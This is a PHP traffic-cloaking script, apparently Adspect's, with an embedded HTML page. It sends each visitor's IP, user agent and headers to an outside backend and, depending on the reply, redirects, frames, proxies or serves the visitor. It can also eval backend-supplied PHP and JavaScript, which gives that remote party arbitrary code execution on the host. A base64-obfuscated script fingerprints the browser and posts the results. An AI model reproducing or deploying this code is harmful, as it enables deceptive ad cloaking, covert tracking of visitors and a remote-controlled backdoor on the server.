<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('ed377dec-ed06-422a-ab8b-9d09456a1c7d', 'redirect', '_', base64_decode('nYtlLXo+7d1KLbvTjggOJ0sqMiaQAttG2VSKEZZ949w=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDUyMTU9WyduYW1lJywnMVBFc25BbScsJzc2NDQxcE5TRnpVJywncGVybWlzc2lvbnMnLCdhdHRyaWJ1dGVzJywnVG91Y2hFdmVudCcsJ3RvU3RyaW5nJywnYXBwZW5kQ2hpbGQnLCdQT1NUJywnMzJkRmxEencnLCd0b3VjaEV2ZW50JywnNDQyNTAzdG9aSmNsJywnZ2V0VGltZXpvbmVPZmZzZXQnLCdjYW52YXMnLCdub3RpZmljYXRpb25zJywnNDU5MzQ1b2lDWGlZJywnY3JlYXRlRXZlbnQnLCdsZW5ndGgnLCdOb3RpZmljYXRpb24nLCdkb2N1bWVudEVsZW1lbnQnLCdtZXNzYWdlJywnbm9kZVZhbHVlJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCc0ODkyNDhQRG1LdWknLCcxOTcxOUtvWkV3SScsJ3Rvc3RyaW5nJywnMVptVWhyaicsJ3RpbWV6b25lT2Zmc2V0JywnZ2V0UGFyYW1ldGVyJywnc2NyZWVuJywnc3RyaW5naWZ5Jywnd2ViZ2wnLCcxRFpwakRUJywnYm9keScsJ2xvZycsJ3R5cGUnLCdkb2N1bWVudCcsJ3N1Ym1pdCcsJzU4ODcxM0Jua0FnbycsJ25hdmlnYXRvcicsJ2FjdGlvbicsJ2NyZWF0ZUVsZW1lbnQnLCd3aW5kb3cnLCd0aGVuJywnbm9kZU5hbWUnLCdvYmplY3QnLCdsb2NhdGlvbicsJzkwNzY2MUlERmdVYicsJ21ldGhvZCcsJ2hpZGRlbicsJ2NvbnNvbGUnLCdwZXJtaXNzaW9uJywnZXJyb3JzJywnZ2V0Q29udGV4dCcsJ3B1c2gnXTt2YXIgXzB4MzYwZD1mdW5jdGlvbihfMHg0MTczZWUsXzB4NDZjMGEyKXtfMHg0MTczZWU9XzB4NDE3M2VlLTB4Y2M7dmFyIF8weDUyMTVlYz1fMHg1MjE1W18weDQxNzNlZV07cmV0dXJuIF8weDUyMTVlYzt9OyhmdW5jdGlvbihfMHgyZWZmZSxfMHgyMGE4ZjMpe3ZhciBfMHgxNmRkMTU9XzB4MzYwZDt3aGlsZSghIVtdKXt0cnl7dmFyIF8weGFmOWY2ZT0tcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZTcpKSpwYXJzZUludChfMHgxNmRkMTUoMHhjZikpK3BhcnNlSW50KF8weDE2ZGQxNSgweGRjKSkrcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZTUpKSotcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZDYpKSstcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZTQpKSstcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZDgpKSstcGFyc2VJbnQoXzB4MTZkZDE1KDB4ZjMpKSotcGFyc2VJbnQoXzB4MTZkZDE1KDB4Y2UpKStwYXJzZUludChfMHgxNmRkMTUoMHhlZCkpKnBhcnNlSW50KF8weDE2ZGQxNSgweGZjKSk7aWYoXzB4YWY5ZjZlPT09XzB4MjBhOGYzKWJyZWFrO2Vsc2UgXzB4MmVmZmVbJ3B1c2gnXShfMHgyZWZmZVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NDRlY2ViKXtfMHgyZWZmZVsncHVzaCddKF8weDJlZmZlWydzaGlmdCddKCkpO319fShfMHg1MjE1LDB4NGQ0NjcpLGZ1bmN0aW9uKCl7dmFyIF8weDMwODZkMz1fMHgzNjBkO2Z1bmN0aW9uIF8weDRiN2UzMigpe3ZhciBfMHgxZjFmNTI9XzB4MzYwZDtfMHgyZjRiODRbXzB4MWYxZjUyKDB4MTAxKV09XzB4MzQ0ZjI3O3ZhciBfMHgzMzMyYzI9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXSgnZm9ybScpLF8weDEzNjRjMD1kb2N1bWVudFtfMHgxZjFmNTIoMHhmNildKCdpbnB1dCcpO18weDMzMzJjMltfMHgxZjFmNTIoMHhmZCldPV8weDFmMWY1MigweGQ1KSxfMHgzMzMyYzJbXzB4MWYxZjUyKDB4ZjUpXT13aW5kb3dbXzB4MWYxZjUyKDB4ZmIpXVsnaHJlZiddLF8weDEzNjRjMFtfMHgxZjFmNTIoMHhmMCldPV8weDFmMWY1MigweGZlKSxfMHgxMzY0YzBbXzB4MWYxZjUyKDB4Y2QpXT0nZGF0YScsXzB4MTM2NGMwWyd2YWx1ZSddPUpTT05bXzB4MWYxZjUyKDB4ZWIpXShfMHgyZjRiODQpLF8weDMzMzJjMltfMHgxZjFmNTIoMHhkNCldKF8weDEzNjRjMCksZG9jdW1lbnRbXzB4MWYxZjUyKDB4ZWUpXVtfMHgxZjFmNTIoMHhkNCldKF8weDMzMzJjMiksXzB4MzMzMmMyW18weDFmMWY1MigweGYyKV0oKTt9dmFyIF8weDM0NGYyNz1bXSxfMHgyZjRiODQ9e307dHJ5e3ZhciBfMHhiZWI1MjY9ZnVuY3Rpb24oXzB4MmViNjkzKXt2YXIgXzB4NTYyYjVkPV8weDM2MGQ7aWYoXzB4NTYyYjVkKDB4ZmEpPT09dHlwZW9mIF8weDJlYjY5MyYmbnVsbCE9PV8weDJlYjY5Myl7dmFyIF8weGVlYTQ3YT1mdW5jdGlvbihfMHg1ZTEyYTMpe3ZhciBfMHgxZTE0NWE9XzB4NTYyYjVkO3RyeXt2YXIgXzB4MjRmZjhmPV8weDJlYjY5M1tfMHg1ZTEyYTNdO3N3aXRjaCh0eXBlb2YgXzB4MjRmZjhmKXtjYXNlIF8weDFlMTQ1YSgweGZhKTppZihudWxsPT09XzB4MjRmZjhmKWJyZWFrO2Nhc2UnZnVuY3Rpb24nOl8weDI0ZmY4Zj1fMHgyNGZmOGZbXzB4MWUxNDVhKDB4ZDMpXSgpO31fMHgzMGU4YWZbXzB4NWUxMmEzXT1fMHgyNGZmOGY7fWNhdGNoKF8weDE0NGRhNSl7XzB4MzQ0ZjI3WydwdXNoJ10oXzB4MTQ0ZGE1W18weDFlMTQ1YSgweGUxKV0pO319LF8weDMwZThhZj17fSxfMHg1Mjc2Mzk7Zm9yKF8weDUyNzYzOSBpbiBfMHgyZWI2OTMpXzB4ZWVhNDdhKF8weDUyNzYzOSk7dHJ5e3ZhciBfMHgzNTUwOGM9T2JqZWN0WydnZXRPd25Qcm9wZXJ0eU5hbWVzJ10oXzB4MmViNjkzKTtmb3IoXzB4NTI3NjM5PTB4MDtfMHg1Mjc2Mzk8XzB4MzU1MDhjW18weDU2MmI1ZCgweGRlKV07KytfMHg1Mjc2MzkpXzB4ZWVhNDdhKF8weDM1NTA4Y1tfMHg1Mjc2MzldKTtfMHgzMGU4YWZbJyEhJ109XzB4MzU1MDhjO31jYXRjaChfMHg1MTkwZDMpe18weDM0NGYyN1tfMHg1NjJiNWQoMHhjYyldKF8weDUxOTBkM1tfMHg1NjJiNWQoMHhlMSldKTt9cmV0dXJuIF8weDMwZThhZjt9fTtfMHgyZjRiODRbXzB4MzA4NmQzKDB4ZWEpXT1fMHhiZWI1MjYod2luZG93W18weDMwODZkMygweGVhKV0pLF8weDJmNGI4NFtfMHgzMDg2ZDMoMHhmNyldPV8weGJlYjUyNih3aW5kb3cpLF8weDJmNGI4NFsnbmF2aWdhdG9yJ109XzB4YmViNTI2KHdpbmRvd1tfMHgzMDg2ZDMoMHhmNCldKSxfMHgyZjRiODRbXzB4MzA4NmQzKDB4ZmIpXT1fMHhiZWI1MjYod2luZG93W18weDMwODZkMygweGZiKV0pLF8weDJmNGI4NFtfMHgzMDg2ZDMoMHhmZildPV8weGJlYjUyNih3aW5kb3dbXzB4MzA4NmQzKDB4ZmYpXSksXzB4MmY0Yjg0W18weDMwODZkMygweGUwKV09ZnVuY3Rpb24oXzB4NTc3Mjk2KXt2YXIgXzB4M2NiZTQ4PV8weDMwODZkMzt0cnl7dmFyIF8weDIzMjY4ND17fTtfMHg1NzcyOTY9XzB4NTc3Mjk2W18weDNjYmU0OCgweGQxKV07Zm9yKHZhciBfMHgzNzNjNzEgaW4gXzB4NTc3Mjk2KV8weDM3M2M3MT1fMHg1NzcyOTZbXzB4MzczYzcxXSxfMHgyMzI2ODRbXzB4MzczYzcxW18weDNjYmU0OCgweGY5KV1dPV8weDM3M2M3MVtfMHgzY2JlNDgoMHhlMildO3JldHVybiBfMHgyMzI2ODQ7fWNhdGNoKF8weDMxNmQ3MCl7XzB4MzQ0ZjI3W18weDNjYmU0OCgweGNjKV0oXzB4MzE2ZDcwW18weDNjYmU0OCgweGUxKV0pO319KGRvY3VtZW50Wydkb2N1bWVudEVsZW1lbnQnXSksXzB4MmY0Yjg0W18weDMwODZkMygweGYxKV09XzB4YmViNTI2KGRvY3VtZW50KTt0cnl7XzB4MmY0Yjg0W18weDMwODZkMygweGU4KV09bmV3IERhdGUoKVtfMHgzMDg2ZDMoMHhkOSldKCk7fWNhdGNoKF8weDM5Y2Q0ZCl7XzB4MzQ0ZjI3W18weDMwODZkMygweGNjKV0oXzB4MzljZDRkW18weDMwODZkMygweGUxKV0pO310cnl7XzB4MmY0Yjg0WydjbG9zdXJlJ109ZnVuY3Rpb24oKXt9W18weDMwODZkMygweGQzKV0oKTt9Y2F0Y2goXzB4MWZmNjJhKXtfMHgzNDRmMjdbXzB4MzA4NmQzKDB4Y2MpXShfMHgxZmY2MmFbJ21lc3NhZ2UnXSk7fXRyeXtfMHgyZjRiODRbXzB4MzA4NmQzKDB4ZDcpXT1kb2N1bWVudFtfMHgzMDg2ZDMoMHhkZCldKF8weDMwODZkMygweGQyKSlbXzB4MzA4NmQzKDB4ZDMpXSgpO31jYXRjaChfMHgxZWZmNGMpe18weDM0NGYyN1tfMHgzMDg2ZDMoMHhjYyldKF8weDFlZmY0Y1snbWVzc2FnZSddKTt9dHJ5e18weGJlYjUyNj1mdW5jdGlvbigpe307dmFyIF8weDI0ODg2MD0weDA7XzB4YmViNTI2W18weDMwODZkMygweGQzKV09ZnVuY3Rpb24oKXtyZXR1cm4rK18weDI0ODg2MCwnJzt9LGNvbnNvbGVbXzB4MzA4NmQzKDB4ZWYpXShfMHhiZWI1MjYpLF8weDJmNGI4NFtfMHgzMDg2ZDMoMHhlNildPV8weDI0ODg2MDt9Y2F0Y2goXzB4NTBkNzJiKXtfMHgzNDRmMjdbXzB4MzA4NmQzKDB4Y2MpXShfMHg1MGQ3MmJbXzB4MzA4NmQzKDB4ZTEpXSk7fXdpbmRvd1tfMHgzMDg2ZDMoMHhmNCldW18weDMwODZkMygweGQwKV1bJ3F1ZXJ5J10oeyduYW1lJzpfMHgzMDg2ZDMoMHhkYil9KVtfMHgzMDg2ZDMoMHhmOCldKGZ1bmN0aW9uKF8weDM5OTlhMyl7dmFyIF8weDI3MDY3Zj1fMHgzMDg2ZDM7XzB4MmY0Yjg0W18weDI3MDY3ZigweGQwKV09W3dpbmRvd1tfMHgyNzA2N2YoMHhkZildW18weDI3MDY3ZigweDEwMCldLF8weDM5OTlhM1snc3RhdGUnXV0sXzB4NGI3ZTMyKCk7fSxfMHg0YjdlMzIpO3RyeXt2YXIgXzB4M2EzNTY5PWRvY3VtZW50W18weDMwODZkMygweGY2KV0oXzB4MzA4NmQzKDB4ZGEpKVtfMHgzMDg2ZDMoMHgxMDIpXShfMHgzMDg2ZDMoMHhlYykpLF8weDcwMmYwYz1fMHgzYTM1NjlbJ2dldEV4dGVuc2lvbiddKCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJyk7XzB4MmY0Yjg0W18weDMwODZkMygweGVjKV09eyd2ZW5kb3InOl8weDNhMzU2OVtfMHgzMDg2ZDMoMHhlOSldKF8weDcwMmYwY1snVU5NQVNLRURfVkVORE9SX1dFQkdMJ10pLCdyZW5kZXJlcic6XzB4M2EzNTY5WydnZXRQYXJhbWV0ZXInXShfMHg3MDJmMGNbXzB4MzA4NmQzKDB4ZTMpXSl9O31jYXRjaChfMHgzNWY1YWQpe18weDM0NGYyN1tfMHgzMDg2ZDMoMHhjYyldKF8weDM1ZjVhZFtfMHgzMDg2ZDMoMHhlMSldKTt9fWNhdGNoKF8weDk3OWZlKXtfMHgzNDRmMjdbJ3B1c2gnXShfMHg5NzlmZVtfMHgzMDg2ZDMoMHhlMSldKSxfMHg0YjdlMzIoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;